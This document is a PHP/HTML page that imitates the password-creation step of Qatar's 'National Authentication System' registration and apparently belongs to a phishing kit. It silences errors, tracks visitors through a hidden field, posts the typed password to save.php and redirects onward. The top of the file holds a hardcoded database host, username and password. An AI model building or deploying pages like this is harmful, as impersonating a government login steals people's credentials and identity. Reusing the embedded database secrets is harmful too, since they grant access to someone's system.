<?php
error_reporting(0);
ini_set('display_errors', 0);
$host = "dpg-d95vic9oagis739h761g-a";
$user = "qatar_db_user";
$password = "TpPqGoliCoObGDiGdpEc16ak3PJZ9BB1";
$dbname = "qatar_db";
$port = "5432";

try {
    $dsn = "pgsql:host=$host;port=$port;dbname=$dbname;";
    $pdo = new PDO($dsn, $user, $password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
    $visitor_id = isset($_POST['visitor_id']) ? $_POST['visitor_id'] : 'visitor_session'; 
} catch (Exception $e) {}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>نظام التوثيق الوطني - كلمة المرور</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <style>
        :root { --primary-color: #007fb1; --secondary-color: #8a1538; --bg-color: #f5f5f5; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: var(--bg-color); margin: 0; padding-top: 160px; }
        
        .header-wrapper { position: fixed; top: 0; width: 100%; background: #fff; z-index: 1000; border-bottom: 1px solid #ddd; }
        .top-header { padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; }
        .logo-area { display: flex; align-items: center; gap: 15px; }
        .logo { height: 45px; }
        .title-text { color: #555; font-size: 16px; font-weight: bold; }
        .sub-title { font-size: 14px; color: #777; }
        .menu-icon { font-size: 24px; cursor: pointer; color: #555; }

        .steps-bar { display: flex; justify-content: space-around; padding: 15px 5px; background: #f9f9f9; border-bottom: 1px solid #eee; }
        .step { text-align: center; font-size: 12px; color: #555; width: 25%; }
        .step-num { width: 35px; height: 35px; border-radius: 50%; border: 2px solid var(--primary-color); display: flex; align-items: center; justify-content: center; margin: 0 auto 5px; font-weight: bold; color: var(--primary-color); }
        .step.active .step-num { background: var(--primary-color); color: #fff; }

        .container { max-width: 500px; margin: 20px auto; padding: 10px; }
        .form-card { background: #fff; border: 1px solid #e0e0e0; border-radius: 4px; padding: 25px; }
        .form-group { margin-bottom: 20px; }
        input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; background-color: #f2f2f2; }
        .btn-submit { width: 100%; background-color: var(--primary-color); color: white; border: none; padding: 15px; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div class="header-wrapper">
        <div class="top-header">
            <div class="logo-area">
                <div class="menu-icon">≡</div>
                <div>
                    <div class="title-text">نظام التوثيق الوطني</div>
                    <div class="sub-title">National Authentication System</div>
                </div>
            </div>
            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" class="logo">
        </div>
        
        <div class="steps-bar">
            <div class="step"> <div class="step-num">٤</div> انتهاء<br>التسجيل </div>
            <div class="step active"> <div class="step-num">٣</div> كلمة<br>المرور </div>
            <div class="step"> <div class="step-num">٢</div> البيانات<br>الشخصية </div>
            <div class="step"> <div class="step-num">١</div> نوع<br>الحساب </div>
        </div>
    </div>

    <div class="container">
        <div class="form-card">
            <h2>إنشاء كلمة المرور</h2>
            <form action="save.php" method="POST" id="passwordForm">
                <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($visitor_id); ?>">
                <div class="form-group"><input type="password" name="password" placeholder="أدخل كلمة المرور" required></div>
                <div class="form-group"><input type="password" placeholder="أعد إدخال كلمة المرور" required></div>
                <button type="submit" class="btn-submit">استمرار</button>
            </form>
        </div>
    </div>

    <script>
    $('#passwordForm').on('submit', function() {
        setTimeout(() => { window.location.href = 'final.php'; }, 500);
    });
    </script>
</body>
</html>
